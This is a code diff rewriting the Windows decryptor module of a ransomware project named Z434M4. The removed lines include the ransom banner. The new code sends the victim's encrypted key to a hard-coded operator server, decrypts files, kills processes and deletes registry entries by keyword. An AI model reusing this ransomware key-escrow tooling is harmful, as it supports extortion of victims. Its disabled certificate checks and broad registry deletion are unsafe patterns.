@@ -1,221 +1,433 @@
-import environment
-import symmetric
-import utils
-
-import subprocess
-import requests
-import base64
-import string 
-import random
-import sys
-import time
 import os
+import sys
+import base64
 import pickle
-
-from cryptography.hazmat.primitives.asymmetric import rsa, padding
+import json
+import time
+import subprocess
+import ctypes
+import winreg
+from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import serialization, hashes
-
-# Fix for SSL certificate issues
 import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-os.environ['REQUESTS_CA_BUNDLE'] = ''  # Clear the certificate path
 
-logo = """
-███████╗██╗  ██╗██████╗ ██╗  ██╗███╗   ███╗██╗  ██╗
-╚══███╔╝██║  ██║╚════██╗██║  ██║████╗ ████║██║  ██║
-  ███╔╝ ███████║ █████╔╝███████║██╔████╔██║███████║
- ███╔╝  ╚════██║ ╚═══██╗╚════██║██║╚██╔╝██║╚════██║
-███████╗     ██║██████╔╝     ██║██║ ╚═╝ ██║     ██║
-╚══════╝     ╚═╝╚═════╝      ╚═╝╚═╝     ╚═╝     ╚═╝
-                                       
-    ALL YOUR FILES ARE ENCRYPTED WITH AES-CBC-256
-    YOUR COMPUTER IS INFECTED WITH MALWARE THAT ENCRYPTED ALL YOUR IMPORTANT FILES
-    THE ONLY WAY TO GET THEM BACK IS WITH THIS DECRYPTOR
-"""
+# Disable SSL warnings to reduce binary size
+urllib3.disable_warnings()
+http = urllib3.PoolManager(cert_reqs='CERT_NONE')
 
+# Colors for console output
+GREEN = '\033[1;32m'
+RED = '\033[91m'
+YELLOW = '\33[93m'
+WHITE = '\33[97m'
 
-BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', \
-                                                 '\33[93m', '\033[1;35m', '\033[1;32m', \
-                                                  '\033[0m'
-
-# environment paths
-ransomware_name = ("Z434M4")
-server_address = ("http://192.168.8.116:8000/decrypt/")  # Use your PC's actual IP address
-home = environment.get_home_path()
-desktop = environment.get_desktop_path()
-username = environment.get_username()
+# Basic config
+ransomware_name = "Z434M4"
+server_address = "http://192.168.8.116:8000/decrypt/"
+home = os.path.expanduser("~")
 ransomware_path = os.path.join(home, ransomware_name)
-machine_id = environment.get_unique_machine_id()
+failed_log_path = os.path.join(ransomware_path, "failed_files.txt")
 
-
-def kill_daemon():
-    process = subprocess.Popen("pidof daemon", shell=True, stdout=subprocess.PIPE,
-                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    output = process.stdout.read() + process.stderr.read()
-    process2 = subprocess.Popen("pidof Z434M4", shell=True, stdout=subprocess.PIPE,
-                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    pid_of_Z434M4 = process2.stdout.read() + process2.stderr.read()
-    
-    process3 = subprocess.Popen("pidof python main.py", shell=True, stdout=subprocess.PIPE,
-                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    pid_of_Z434M4_2 = process3.stdout.read() + process3.stderr.read()
+def get_unique_machine_id():
+    """Get a unique ID for this machine"""
     try:
-        pid_of_Z434M4_2 = pid_of_Z434M4_2.split(' ')[0]
-    except: 
-        pass
+        # Try to get Windows product ID from registry
+        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
+                          r"SOFTWARE\Microsoft\Windows NT\CurrentVersion") as key:
+            return winreg.QueryValueEx(key, "ProductId")[0]
+    except:
+        # Fallback to hostname
+        return os.environ.get('COMPUTERNAME', 'UNKNOWN')
 
-    os.system('kill -9 {}'.format(pid_of_Z434M4))
-    os.system('kill -9 {}'.format(pid_of_Z434M4_2))
-    os.system('kill -9 {}'.format(output))
-    os.system("killall daemon")
-    os.system('killall Z434M4')
-    os.system('killall ./Z434M4')
-    os.system('killall ./daemon')
-
-
-def decrypt_aes_keys(enc, key):
-    key_obj = serialization.load_pem_private_key(
-        key.encode('utf-8') if isinstance(key, str) else key,
-        password=None
-    )
-    plaintext = key_obj.decrypt(
-        enc,
-        padding.OAEP(
-            mgf=padding.MGF1(algorithm=hashes.SHA256()),
-            algorithm=hashes.SHA256(),
-            label=None
-        )
-    )
-    return plaintext
-
-
-def send_to_server_encrypted_private_key(id, private_encrypted_key):
+def reset_wallpaper():
+    """Reset Windows wallpaper to default"""
     try:
-        print(f"Connecting to server at {server_address}...")
-        # Added verify=False to bypass certificate validation
-        ret = requests.post(server_address, data=private_encrypted_key, verify=False)
+        SPI_SETDESKWALLPAPER = 0x0014
+        SPIF_UPDATEINIFILE = 0x01
+        SPIF_SENDCHANGE = 0x02
         
-        if ret.status_code != 200:
-            print(f"Server returned error: {ret.status_code} - {ret.text}")
-            raise Exception(f"Server error: {ret.status_code}")
+        # Try to use default Windows wallpaper
+        default_wallpaper = os.path.join(os.environ['WINDIR'], 'Web', 'Wallpaper', 'Windows', 'img0.jpg')
+        
+        if not os.path.exists(default_wallpaper):
+            default_wallpaper = os.path.join(os.environ['WINDIR'], 'Web', 'Wallpaper', 'Theme1', 'img1.jpg')
+        
+        if os.path.exists(default_wallpaper):
+            ctypes.windll.user32.SystemParametersInfoW(
+                SPI_SETDESKWALLPAPER, 0, default_wallpaper, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
+            )
+            print(f"{GREEN}✓ Wallpaper reset{WHITE}")
+        else:
+            # Set solid color as fallback
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Control Panel\\Colors", 0, 
+                              winreg.KEY_SET_VALUE) as key:
+                winreg.SetValueEx(key, "Background", 0, winreg.REG_SZ, "0 120 215")
+            
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Control Panel\\Desktop", 0, 
+                              winreg.KEY_SET_VALUE) as key:
+                winreg.SetValueEx(key, "WallPaper", 0, winreg.REG_SZ, "")
+            
+            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, "", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
+            print(f"{GREEN}✓ Wallpaper reset to default color{WHITE}")
+    except Exception as e:
+        print(f"{YELLOW}Wallpaper reset failed: {e} (This doesn't affect decryption){WHITE}")
+
+def kill_ransomware_processes():
+    """Terminate ransomware processes"""
+    try:
+        # Kill known process names
+        for process in ["daemon.exe", "Z434M4.exe"]:
+            subprocess.run(["taskkill", "/F", "/IM", process], 
+                          stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+        
+        # Find and kill python processes running main.py
+        subprocess.run(["taskkill", "/F", "/FI", "IMAGENAME eq python.exe", "/FI", "COMMANDLINE eq *main.py*"],
+                      stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+        
+        print(f"{GREEN}✓ Ransomware processes terminated{WHITE}")
+    except Exception as e:
+        print(f"{YELLOW}Process termination error: {e} (This doesn't affect decryption){WHITE}")
+
+def clean_registry():
+    """Remove ransomware registry entries"""
+    try:
+        # Common registry locations for malware persistence
+        reg_locations = [
+            (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
+            (winreg.HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
+            (winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"),
+            (winreg.HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce")
+        ]
+        
+        # Suspicious value patterns
+        suspicious = ["z434m4", "daemon", "decrypt", "ransom", "encrypt"]
+        
+        removals = 0
+        for hkey, subkey in reg_locations:
+            try:
+                with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_READ | winreg.KEY_WRITE) as key:
+                    # First pass: identify values to delete
+                    values_to_delete = []
+                    try:
+                        i = 0
+                        while True:
+                            name, value, _ = winreg.EnumValue(key, i)
+                            name_lower = name.lower()
+                            value_lower = str(value).lower()
+                            
+                            if any(sus in name_lower for sus in suspicious) or \
+                               any(sus in value_lower for sus in suspicious):
+                                values_to_delete.append(name)
+                            i += 1
+                    except WindowsError:
+                        # End of values reached
+                        pass
+                    
+                    # Second pass: delete identified values
+                    for name in values_to_delete:
+                        try:
+                            winreg.DeleteValue(key, name)
+                            removals += 1
+                        except:
+                            pass
+            except:
+                # Can't access this key, just continue
+                pass
+                
+        if removals > 0:
+            print(f"{GREEN}✓ Removed {removals} suspicious registry entries{WHITE}")
+        else:
+            print(f"{GREEN}✓ No suspicious registry entries found{WHITE}")
+    
+    except Exception as e:
+        print(f"{YELLOW}Registry cleaning error: {e} (This doesn't affect decryption){WHITE}")
+
+def decrypt_aes_key(encrypted_key, private_key_pem):
+    """Decrypt AES encryption key using the RSA private key"""
+    try:
+        # Load the private key
+        private_key = serialization.load_pem_private_key(
+            private_key_pem.encode('utf-8') if isinstance(private_key_pem, str) else private_key_pem,
+            password=None
+        )
+        
+        # Decrypt the AES key
+        decrypted_key = private_key.decrypt(
+            encrypted_key,
+            padding.OAEP(
+                mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                algorithm=hashes.SHA256(),
+                label=None
+            )
+        )
+        return decrypted_key
+    except Exception as e:
+        print(f"{RED}Error decrypting AES key: {str(e)}{WHITE}")
+        raise
+
+def decrypt_file(file_path, aes_key):
+    """Decrypt a single file using the AES key"""
+    # Import AESCipher only when needed to save memory
+    from symmetric import AESCipher
+    
+    try:
+        # Skip if file doesn't exist
+        if not os.path.exists(file_path):
+            return False, f"File not found: {file_path}"
+        
+        # Create AES cipher instance with the key
+        cipher = AESCipher(aes_key)
+        
+        # Read encrypted content
+        with open(file_path, 'rb') as f:
+            encrypted_data = f.read()
+        
+        # Decrypt the content
+        try:
+            decrypted_data = cipher.decrypt(encrypted_data)
+        except Exception as e:
+            return False, f"Decryption failed: {str(e)}"
+        
+        # Original file path (without .Z434M4 extension)
+        original_path = file_path.replace(".Z434M4", "")
+        
+        # Make sure directory exists
+        os.makedirs(os.path.dirname(original_path), exist_ok=True)
+        
+        # Write to temporary file first
+        temp_path = original_path + ".tmp"
+        try:
+            with open(temp_path, 'wb') as f:
+                f.write(decrypted_data)
+                
+            # Remove original if it exists
+            if os.path.exists(original_path):
+                os.remove(original_path)
+                
+            # Rename temp to original
+            os.rename(temp_path, original_path)
+        except Exception as e:
+            if os.path.exists(temp_path):
+                os.remove(temp_path)
+            return False, f"File write error: {str(e)}"
+        
+        # Delete the encrypted file
+        try:
+            os.remove(file_path)
+        except:
+            pass  # It's okay if we can't delete the original
+            
+        return True, None
+        
+    except Exception as e:
+        return False, f"Decryption process error: {str(e)}"
+
+def send_to_server(encrypted_key):
+    """Send encrypted private key to server and get decrypted key back"""
+    max_attempts = 3
+    
+    for attempt in range(max_attempts):
+        try:
+            print(f"Connecting to recovery server (attempt {attempt+1}/{max_attempts})...")
+            
+            # Send the request
+            response = http.request(
+                'POST',
+                server_address,
+                body=encrypted_key,
+                headers={'Content-Type': 'application/octet-stream'},
+                timeout=30.0
+            )
+            
+            # Check response
+            if response.status == 200:
+                print(f"{GREEN}✓ Server successfully decrypted the private key{WHITE}")
+                return response.data.decode('utf-8')
+            else:
+                print(f"{YELLOW}Server returned error {response.status}: {response.data.decode()}{WHITE}")
+                
+        except Exception as e:
+            print(f"{YELLOW}Connection error: {str(e)}{WHITE}")
+            
+        # Wait before retrying
+        if attempt < max_attempts - 1:
+            wait_time = 10 * (attempt + 1)
+            print(f"Retrying in {wait_time} seconds...")
+            time.sleep(wait_time)
+    
+    print(f"{RED}Failed to connect to server after {max_attempts} attempts.{WHITE}")
+    print(f"{YELLOW}Please check your internet connection and try again.{WHITE}")
+    sys.exit(1)
+
+def decode_path(path_bytes):
+    """Try multiple encodings to decode file paths"""
+    encodings = ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']
+    
+    for encoding in encodings:
+        try:
+            return path_bytes.decode(encoding)
+        except UnicodeDecodeError:
+            continue
+    
+    # Last resort: forced decode
+    return path_bytes.decode('utf-8', errors='replace')
+
+def format_key_for_server(encrypted_key):
+    """Format the encrypted private key for server transmission"""
+    try:
+        # Handle list of chunks
+        if isinstance(encrypted_key, list):
+            encoded_chunks = []
+            for chunk in encrypted_key:
+                # Make sure each chunk is bytes
+                if not isinstance(chunk, bytes):
+                    chunk = bytes(chunk) if hasattr(chunk, '__bytes__') else str(chunk).encode('utf-8')
+                # Base64 encode each chunk
+                encoded_chunks.append(base64.b64encode(chunk).decode('utf-8'))
+            
+            # Create JSON array of base64-encoded chunks
+            json_data = json.dumps(encoded_chunks)
+            return base64.b64encode(json_data.encode('utf-8'))
+            
+        # Handle single chunk
+        else:
+            if not isinstance(encrypted_key, bytes):
+                encrypted_key = bytes(encrypted_key) if hasattr(encrypted_key, '__bytes__') else str(encrypted_key).encode('utf-8')
+                
+            # Wrap in a list with single item
+            encoded_chunks = [base64.b64encode(encrypted_key).decode('utf-8')]
+            json_data = json.dumps(encoded_chunks)
+            return base64.b64encode(json_data.encode('utf-8'))
             
     except Exception as e:
-        print(f"Error connecting to server: {str(e)}")
-        raise e
+        print(f"{YELLOW}Error formatting key, using fallback method: {e}{WHITE}")
+        # Fallback method
+        json_data = json.dumps([base64.b64encode(str(encrypted_key).encode('utf-8')).decode('utf-8')])
+        return base64.b64encode(json_data.encode('utf-8'))
 
-    print("✓ Key decrypted by server")
-    private_key = ret.text
-    return str(private_key)
+def show_progress(current, total):
+    """Display progress bar in console"""
+    width = 50  # width of progress bar
+    percent = min(100, int(current * 100 / total))
+    filled = int(width * current // total)
+    bar = '█' * filled + '-' * (width - filled)
+    sys.stdout.write(f"\r{YELLOW}Progress: [{bar}] {percent}% ({current}/{total} files){WHITE}")
+    sys.stdout.flush()
 
-
-def payment():
-    pass
-
-
-def menu():
-    print("{}Importing the encrypted client private key".format(WHITE))
+def main():
+    print("\n" + "-" * 60)
+    print(f"{GREEN}Z434M4 RANSOMWARE RECOVERY TOOL (LIGHTWEIGHT VERSION){WHITE}")
+    print("-" * 60 + "\n")
+    
+    machine_id = get_unique_machine_id()
+    
+    print(f"{YELLOW}Step 1: Loading encrypted private key...{WHITE}")
     try:
-        with open(os.path.join(ransomware_path, 'encrypted_client_private_key.key'),
-                  'rb') as f:
-            encrypted_client_private_key = pickle.load(f)
-    except IOError:
-        print("encrypted client private key not found, \
-              I'm sorry. but all your files are lost!")
-        sys.exit(-1)
-
-    print("{}OK{}".format(GREEN, WHITE))
-
-    key_to_be_sent = base64.b64encode(str(encrypted_client_private_key))
-
-    # send to server to be decrypted
-    while True:
-        try:
-            print("Requesting to server to decrypt the private key")
-            client_private_key = send_to_server_encrypted_private_key(machine_id, key_to_be_sent)
-            break
-        except:
-            print("{}No connection, sleeping for 2 minutes\nConnect \
-                  to internet to get your files back!{}".format(RED, WHITE))
-            time.sleep(120)
-
-    # saving to disk the private key
-    print("{}Client private key decrypted and stored to disk{}".format(GREEN, WHITE))
+        key_path = os.path.join(ransomware_path, 'encrypted_client_private_key.key')
+        with open(key_path, 'rb') as f:
+            encrypted_private_key = pickle.load(f)
+        print(f"{GREEN}✓ Encrypted private key loaded{WHITE}")
+    except Exception as e:
+        print(f"{RED}ERROR: Failed to load encrypted private key: {str(e)}{WHITE}")
+        print(f"{YELLOW}Please verify the file exists at: {key_path}{WHITE}")
+        sys.exit(1)
+    
+    print(f"{YELLOW}Step 2: Preparing key for server request...{WHITE}")
+    key_to_send = format_key_for_server(encrypted_private_key)
+    print(f"{GREEN}✓ Key formatted for server{WHITE}")
+    
+    print(f"{YELLOW}Step 3: Requesting key decryption from server...{WHITE}")
+    private_key_pem = send_to_server(key_to_send)
+    
+    print(f"{YELLOW}Step 4: Saving decrypted private key...{WHITE}")
     with open(os.path.join(ransomware_path, "client_private_key.PEM"), 'wb') as f:
-        f.write(client_private_key)
-
-    # GET THE AES KEYS and path
+        f.write(private_key_pem.encode('utf-8'))
+    print(f"{GREEN}✓ Private key saved{WHITE}")
+    
+    print(f"{YELLOW}Step 5: Loading encrypted AES keys...{WHITE}")
     try:
-        with open(os.path.join(ransomware_path, "AES_encrypted_keys.txt")) as f:
-            content = f.read()
-    except IOError:
-        print("AES keys not found. Sorry but all your files are lost!")
-        sys.exit(-1)
-
-    # get the aes keys and IV's and paths back
-    print('Decrypting the files ...')
-    content = content.split('\n')
-    content.remove('')
-    aes_and_path = []
-    for line in content:
-        ret = line.split(' ') # enc(KEY) base64(PATH)
-        encrypted_aes_key = base64.b64decode(ret[0])
-        aes_key = decrypt_aes_keys(encrypted_aes_key, client_private_key)
-
-        aes_and_path.append((aes_key, base64.b64decode(ret[1])))
-
-    for _ in aes_and_path:
-        dec = symmetric.AESCipher(_[0])
+        keys_path = os.path.join(ransomware_path, "AES_encrypted_keys.txt")
+        with open(keys_path) as f:
+            content = f.read().strip().split('\n')
+        print(f"{GREEN}✓ Encrypted AES keys loaded ({len(content)} files found){WHITE}")
+    except Exception as e:
+        print(f"{RED}ERROR: Failed to load AES keys: {str(e)}{WHITE}")
+        print(f"{YELLOW}Please verify the file exists at: {keys_path}{WHITE}")
+        sys.exit(1)
+    
+    print(f"{YELLOW}Step 6: Decrypting files...{WHITE}")
+    
+    # Process all files
+    successful = 0
+    failed = []
+    total = len(content)
+    
+    # Batch process files with progress display
+    for i, line in enumerate(content):
+        if i % 10 == 0 or i == total - 1:
+            show_progress(i, total)
         
-        with open(_[1], 'rb') as f:
-            encrypted_file_content = f.read()
+        try:
+            parts = line.split(' ')
+            if len(parts) != 2:
+                failed.append(f"Invalid format: {line}")
+                continue
+                
+            # Get key and path
+            encrypted_aes_key = base64.b64decode(parts[0])
+            path_bytes = base64.b64decode(parts[1])
+            
+            # Decrypt AES key with private key
+            aes_key = decrypt_aes_key(encrypted_aes_key, private_key_pem)
+            
+            # Handle path encoding
+            path_str = decode_path(path_bytes)
+            
+            # Decrypt the file
+            success, error = decrypt_file(path_str, aes_key)
+            
+            if success:
+                successful += 1
+            else:
+                failed.append(f"{path_str}: {error}")
+                
+        except Exception as e:
+            failed.append(f"Processing error: {str(e)}")
+    
+    # Show final progress
+    show_progress(total, total)
+    print("\n")
+    
+    # Report results
+    print(f"\n{GREEN}Successfully decrypted: {successful} files{WHITE}")
+    
+    if failed:
+        print(f"{RED}Failed to decrypt: {len(failed)} files{WHITE}")
         
-        # decrypt content
-        decrypted_file_content = dec.decrypt(encrypted_file_content)
+        # Save failed files for reference
+        with open(failed_log_path, 'w') as f:
+            for entry in failed:
+                f.write(f"{entry}\n")
+        print(f"{YELLOW}Failed files list saved to: {failed_log_path}{WHITE}")
+    else:
+        print(f"{GREEN}✓ All files successfully decrypted!{WHITE}")
+    
+    print(f"\n{YELLOW}Step 7: Cleaning up system...{WHITE}")
+    kill_ransomware_processes()
+    clean_registry()
+    reset_wallpaper()
+    
+    print(f"\n{GREEN}=== RECOVERY COMPLETE ==={WHITE}")
+    print(f"{GREEN}Your system has been restored.{WHITE}")
+    print(f"{YELLOW}For additional security, please run a full antivirus scan.{WHITE}")
 
-        # save into new file without .Z434M4 extension
-        old_file_name = _[1].replace(".Z434M4", "")
-        with open(old_file_name, 'wb') as f:
-            f.write(decrypted_file_content)
-        
-        # delete old encrypted file
-        utils.shred(_[1])
-
-    # Look for the extensions file
-    extensions_file_path = os.path.join(ransomware_path, "file_extensions.dat.Z434M4")
-    if os.path.exists(extensions_file_path):
-        # Find its key in the aes_and_path list
-        for item in aes_and_path:
-            if extensions_file_path.encode('utf-8') in item[1]:
-                ext_key = item[0]
-                
-                # Decrypt the extensions file
-                with open(extensions_file_path, 'rb') as f:
-                    encrypted_ext_data = f.read()
-                    
-                dec = symmetric.AESCipher(ext_key)
-                decrypted_ext_data = dec.decrypt(encrypted_ext_data)
-                
-                # Load the extensions map
-                extensions_map = pickle.loads(decrypted_ext_data)
-                
-                # Restore all file extensions
-                for encrypted_path, original_ext in extensions_map.items():
-                    if os.path.exists(encrypted_path):
-                        try:
-                            # Rename to restore original extension
-                            file_base = os.path.splitext(encrypted_path)[0]
-                            os.rename(encrypted_path, file_base + original_ext)
-                            print(f"Restored extension for {file_base + original_ext}")
-                        except Exception as e:
-                            print(f"Error restoring extension for {encrypted_path}: {str(e)}")
-
-    # end of decryptor
-    print("{}Decryption finished!{}".format(GREEN, WHITE))
-
-    # kill deamon running on bg
-    kill_daemon()
-
-
-if __name__ == "__main__": 
-    print(logo)
-    menu()
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n\n{RED}Decryption interrupted by user.{WHITE}")
+        sys.exit(1)
+    except Exception as e:
+        print(f"\n\n{RED}Unhandled error: {str(e)}{WHITE}")
+        print(f"{YELLOW}Please report this error and try again.{WHITE}")
+        sys.exit(1)
